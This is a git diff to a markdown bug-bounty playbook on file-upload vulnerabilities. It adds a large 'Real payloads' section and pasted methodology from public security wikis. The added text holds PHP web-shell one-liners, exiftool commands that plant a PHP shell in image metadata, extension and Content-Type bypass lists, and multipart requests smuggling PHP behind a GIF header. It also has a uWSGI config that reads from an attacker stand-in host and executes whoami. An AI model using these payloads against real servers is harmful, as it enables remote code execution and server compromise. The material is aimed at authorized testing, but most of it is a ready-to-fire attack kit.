@@ -1,7 +1,7 @@
 # Real-World Playbook — File Upload
 
 **Class:** `file-upload` · **Coverage-matrix tier:** 1 · **Hunter2:** fuxploider (vuln_scanner.sh) · tools/multipart_mutator.py · **Skill:** web2-vuln-classes
-**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow)
+**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)
 
 ## Why it pays (real bounty signal)
 Top disclosed File Upload reports peak at **$5,000**. Rewarded across: Aiven Ltd, CS Money, GitHub Security Lab, GitLab, Mail.ru, Mozilla, Open-Xchange, Pornhub.
@@ -11,9 +11,9 @@ Top disclosed File Upload reports peak at **$5,000**. Rewarded across: Aiven Ltd
 
 - **[Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia** — Aiven Ltd, $5,000 · 56👍 · [1547877](https://hackerone.com/reports/1547877)
 - **Unrestricted file upload on [ambassador.mail.ru]** — Mail.ru, $3,000 · 404👍 · [854032](https://hackerone.com/reports/854032)
-- **External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing** — TikTok, $2,727 · 158👍 · [1062888](https://hackerone.com/reports/1062888)
+- **External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing** — TikTok, $2,727 · 159👍 · [1062888](https://hackerone.com/reports/1062888)
 - **(Pornhub & Youporn & Brazzers ANDROID APP) : Upload Malicious APK / Overrite Existing APK  / Android BackOffice Access** — Pornhub, $1,500 · 16👍 · [142352](https://hackerone.com/reports/142352)
-- **Blind XSS on image upload** — CS Money, $1,000 · 446👍 · [1010466](https://hackerone.com/reports/1010466)
+- **Blind XSS on image upload** — CS Money, $1,000 · 449👍 · [1010466](https://hackerone.com/reports/1010466)
 - **After the upload of an private file, using transformations, the file becomes public without the possibility of changing it.** — Mozilla, $1,000 · 63👍 · [1984060](https://hackerone.com/reports/1984060)
 - **Shell upload in http://widget.support.my.com/** — Mail.ru, $1,000 · 36👍 · [317043](https://hackerone.com/reports/317043)
 - **e.mail.ru: File upload "Chapito" circus** — Mail.ru, $1,000 · 2👍 · [20616](https://hackerone.com/reports/20616)
@@ -270,6 +270,256 @@ file.pHP5
             ```php
             exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
             ```
+
+## Real payloads
+*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*
+
+### PayloadsAllTheThings
+```
+    .php
+    .php3
+    .php4
+    .php5
+    .php7
+
+    # Less known PHP extensions
+    .pht
+    .phps
+    .phar
+    .phpt
+    .pgif
+    .phtml
+    .phtm
+    .inc
+```
+```
+    .asp
+    .aspx
+    .config
+    .cer # (IIS <= 7.5)
+    .asa # (IIS <= 7.5)
+    shell.aspx;1.jpg # (IIS < 7.0)
+    shell.soap
+```
+```
+    Content-Type: image/gif
+    Content-Type: image/png
+    Content-Type: image/jpeg
+```
+```
+    text/php
+    text/x-php
+    application/php
+    application/x-php
+    application/x-httpd-php
+    application/x-httpd-php-source
+```
+```
+    <script language="php">system("id");</script>
+```
+```
+    <?=`id`?>
+```
+```
+convert -size 110x110 xc:white payload.jpg
+exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
+```
+```
+AddType mime-type extension [extension ...]
+```
+```
+AddType application/x-httpd-php .rce
+```
+```
+[uwsgi]
+; read from a symbol
+foo = @(sym://uwsgi_funny_function)
+; read from binary appended data
+bar = @(data://[ATTACKER.DOMAIN.TLD])
+; read from http
+test = @(http://[ATTACKER.DOMAIN.TLD])
+; read from a file descriptor
+content = @(fd://[ATTACKER.DOMAIN.TLD])
+; read from a process stdout
+body = @(exec://whoami)
+; call a function returning a char *
+characters = @(call://uwsgi_func)
+```
+```
+    "scripts": {
+        "prepare" : "/bin/touch /tmp/pwned.txt"
+    }
+```
+```
+    "scripts": {
+        "pre-command-run" : [
+        "/bin/touch /tmp/pwned.txt"
+        ]
+    }
+```
+```
+/usr/lib/pythonX.Y/site-packages/
+```
+
+## Real attacker flow / methodology
+*(how real hunters approach this class step by step)*
+
+### From OWASP WSTG (testing guide)
+### Upload of Unexpected File Types
+
+|ID          |
+|------------|
+|WSTG-BUSL-08|
+
+#### Summary
+
+Many applications' business processes allow for the upload and manipulation of data that is submitted via files. But the business process must check the files and only allow certain "approved" file types. Deciding what files are "approved" is determined by the business logic and is application/system specific. The risk is that by allowing users to upload files, attackers may submit an unexpected file type that could be executed and adversely impact the application or system through attacks that may deface the site, perform remote commands, browse the system files, browse the local resources, attack other servers, or exploit the local vulnerabilities, just to name a few.
+
+Vulnerabilities related to the upload of unexpected file types is unique in that the upload should quickly reject a file if it does not have a specific extension. Additionally, this is different from uploading malicious files in that in most cases an incorrect file format may not by it self be inherently "malicious" but may be detrimental to the saved data. For example if an application accepts Windows Excel files, if a similar database file is uploaded it may be read but data extracted may be moved to incorrect locations.
+
+The application may be expecting only certain file types to be uploaded for processing, such as `.csv` or `.txt` files. The application may not validate the uploaded file by extension (for low assurance file validation) or content (high assurance file validation). This may result in unexpected system or database results within the application/system or give attackers additional methods to exploit the application/system.
+
+##### Example
+
+Suppose a picture sharing application allows users to upload a `.gif` or `.jpg` graphic file to the site. What if an attacker is able to upload an HTML file with a `<script>` tag in it or PHP file? The system may move the file from a temporary location to the final location where the PHP code can now be executed against the application or system.
+
+#### Test Objectives
+
+- Review the project documentation for file types that are rejected by the system.
+- Verify that the unwelcomed file types are rejected and handled safely.
+- Verify that file batch uploads are secure and do not allow any bypass against the set security measures.
+
+#### How to Test
+
+##### Specific Testing Method
+
+- Study the applications logical requirements.
+- Prepare a library of files that are "not approved" for upload that may contain files such as: jsp, exe, or HTML files containing script.
+- In the application navigate to the file submission or upload mechanism.
+- Submit the "not approved" file for upload and verify that they are properly prevented from uploading
+- Check if the site only does file type checks in client-side JavaScript
+- Check if the site only checks the file type by "Content-Type" in HTTP request.
+- Check if the site only checks the file type by the file extension.
+- Check if other uploaded files can be accessed directly by specified URL.
+- Check if the uploaded file can include code or script injection.
+- Check if there is any file path checking for uploaded files. Especially, hackers may compress files with specified path in ZIP so that the extracted files can be uploaded to intended path after uploading and unzipping.
+
+#### Related Test Cases
+
+- [File Extensions Handling for Sensitive Information](../02-Configuration_and_Deployment_Management/03-File_Extensions_Handling_for_Sensitive_Information.md)
+- [Test Upload of Malicious Files](09-Upload_of_Malicious_Files.md)
+
+#### Remediation
+
+Applications should be developed with mechanisms to only accept and manipulate "acceptable" files that the rest of the application functionality is ready to handle and expecting. Some specific examples include: deny lists or allow lists of file extensions, using "Content-Type" from the header, or using a file type recognizer, all to only allow specified file types into the system.
+
+#### References
+
+- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
+- [File upload security best practices: Block a malicious file upload](https://www.computerweekly.com/answer/File-upload-security-best-practices-Block-a-malicious-file-upload)
+- [Stop people uploading malicious PHP files via forms](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)
+- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
+
+### From AllAboutBugBounty
+### Arbitrary File Upload
+
+#### Introduction
+An arbitrary file upload vulnerability is a type of security flaw that allows an attacker to upload malicious files onto a server.
+
+#### Where to find
+In upload file feature, for example upload photo profile feature
+
+#### How to exploit
+1. Change the `Content-Type` value
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php
+```
+Change the Content-Type
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/jpeg
+```
+
+2. Try to change the extension when send the request, for example in here you cant upload file with ext php but you can upload jpg file
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
+Content-Type: application/x-php
+```
+Change the request to this
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php
+```
+
+3. Upload the payload, but start with GIF89a; and
+```
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/gif
+
+GIF89a; <?php system("id") ?>
+```
+And dont forget to change the content-type to image/gif
+
+4. Bypass content length validation, it can be bypassed using small payload
+```
+(<?=`$_GET[x]`?>)
+```
+
+
+*(truncated — open the source link for the full method)*
+
+### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
+### File Upload
+
+
+#### File Upload General Methodology
+
+Other useful extensions:
+
+- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
+  - **Working in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
+- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
+- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
+- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
+- **Flash**: _.swf_
+- **Perl**: _.pl, .cgi_
+- **Erlang Yaws Web Server**: _.yaws_
+
+##### Bypass file extensions checks
+
+1. If they apply, the **check** the **previous extensions.** Also test them using some **uppercase letters**: _pHp, .pHP5, .PhAr ..._
+2. _Check **adding a valid extension before** the execution extension (use previous extensions also):_
+   - _file.png.php_
+   - _file.png.Php5_
+
+*(truncated — open the source link for the full method)*
 
 ## Chaining — always ask "what does this unlock?"
 - Upload webshell (ext/mime/magic bypass) → RCE
